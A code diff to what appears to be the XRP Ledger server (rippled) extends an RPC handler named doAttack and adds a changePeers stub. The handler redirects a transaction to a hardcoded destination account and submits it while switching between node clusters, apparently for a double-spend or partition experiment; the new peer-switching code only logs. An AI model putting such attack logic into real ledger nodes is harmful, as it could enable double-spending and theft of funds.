@@ -20,6 +20,7 @@
 #include <ripple/app/ledger/LedgerMaster.h>
 #include <ripple/app/misc/HashRouter.h>
 #include <ripple/app/misc/Transaction.h>
+#include <ripple/app/misc/ValidatorList.h>
 #include <ripple/app/tx/apply.h>
 #include <ripple/net/RPCErr.h>
 #include <ripple/protocol/ErrorCodes.h>
@@ -169,10 +170,14 @@ Json::Value doSubmit (RPC::Context& context)
 // }
 Json::Value doAttack (RPC::Context& context)
 {
+    auto j = context.app.journal ("Attack");
+    JLOG (j.warn()) << "Starting doAttack";
+
     context.loadType = Resource::feeMediumBurdenRPC;
 
     if (!context.params.isMember (jss::tx_blob))
     {
+        changePeers(context, 1, j);
         auto const failType = getFailHard (context);
 
         // import tx_json-field into context.params:
@@ -193,6 +198,8 @@ Json::Value doAttack (RPC::Context& context)
         
         tx[jss::Destination] = "rnkP5Tipm14sqpoDetQxrLjiyyKhk72eAi";
         context.params[jss::tx_json] = tx;
+
+        changePeers(context, 2, j);
 
         ret = RPC::transactionSubmitAttack (
             context.params, failType, context.role,
@@ -303,6 +310,27 @@ Json::Value doAttack (RPC::Context& context)
     }
 }
 
+Json::Value changePeers (RPC::Context& context, int cluster_idx, beast::Journal j)
+{
+    JLOG (j.warn()) << "changePeers: currently " << context.app.overlay ().size() << " nodes.";
+    
+    Json::Value jvResult (Json::objectValue);
+    jvResult[jss::peers] = context.app.overlay ().json ();
+
+    // cluster_idx: 0 (all), 1 (1,2,3), 2 (4,5,6)
+    assert(cluster_idx == -1 || cluster_idx == 0 || cluster_idx == 1 || cluster_idx == 2);
+    if (cluster_idx == 0) {
+        JLOG (j.warn()) << "changePeers: Use all nodes";
+
+        context.app.overlay ().getActivePeers();
+    } else if (cluster_idx == -1) {
+        JLOG (j.warn()) << "changePeers: Remove all nodes";
+    } else {
+        JLOG (j.warn()) << "changePeers to " << cluster_idx;
+    }
+
+    return jvResult;
+}
 // End attacker code
 
 } // ripple
